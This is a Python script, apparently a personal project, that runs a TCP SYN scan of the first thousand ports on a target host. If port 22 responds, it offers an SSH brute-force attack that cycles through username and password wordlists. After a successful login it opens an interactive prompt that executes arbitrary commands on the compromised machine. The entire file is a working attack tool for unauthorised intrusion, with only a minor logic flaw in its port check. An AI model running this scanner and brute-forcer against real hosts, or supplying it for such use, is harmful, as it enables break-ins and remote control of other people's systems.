import random
import paramiko
from scapy.all import *
from scapy.layers.inet import TCP, IP, sr1, ICMP


Registered_ports=range(1,1023)
Open_Ports=[]

def BruteForce(atak_port):

    authenticated=False
    cmd=""

    SSHClient=paramiko.SSHClient()
    SSHClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(r"/home/jacek/GitHub/MojeProjekty/Python/users.txt", "r") as users_plik:
        users=users_plik.read().split('\n')
    with open(r"/home/jacek/GitHub/MojeProjekty/Python/passwords.txt", "r") as passwords_plik:
        passwords=passwords_plik.read().split('\n')

    for user in users:
        for password in passwords:
            try:
                print("[DEBUG] username:{}, password:{}".format(user,password))
                SSHClient.connect(hostname=target, username=user,password=password,timeout=1,port=atak_port)
                print(" -------------------------------------------------------------------")
                print("[+] Login succed with user: {} and password: {}".format(user,password))
                print(" -------------------------------------------------------------------")
                while True:
                    cmd=input("Choose a command to execute in the system or exit: ")
                    if cmd == "exit":
                        SSHClient.close()
                        exit(0)
                    else:
                        std_in, std_out, std_err = SSHClient.exec_command(cmd)
                        authenticated = True
                        print("Command Execute:\n{} \nErrors:\n{}\n".format(std_out.read().decode(),std_err.read().decode()))
            except paramiko.ssh_exception.AuthenticationException as error:
                print(f"login:{user} and password:{password} failed")


target = input("Please specify a target: ")
#10.0.0.122
Port22 = False

for destination_port in range(0, 1000):
    src_port = random.randint(1,65534)
    response = sr1(IP(dst=target)/TCP(sport=src_port,dport=destination_port,flags="S"),timeout=1,verbose=0)
    if(response.haslayer(TCP)):
        if destination_port==22:
            Port22=True
        if(response.getlayer(TCP).flags == 0x12):
            close_connection = sr(IP(dst=target)/TCP(sport=src_port,dport=destination_port,flags='R'),timeout=1, verbose=0)
            print(f" port {destination_port} is open.")

if Port22==True:
    attack=input("brute-force attack on that port 22 ? (y/n): ")
    if attack=="y":
        BruteForce(22)
    else:
        exit(0)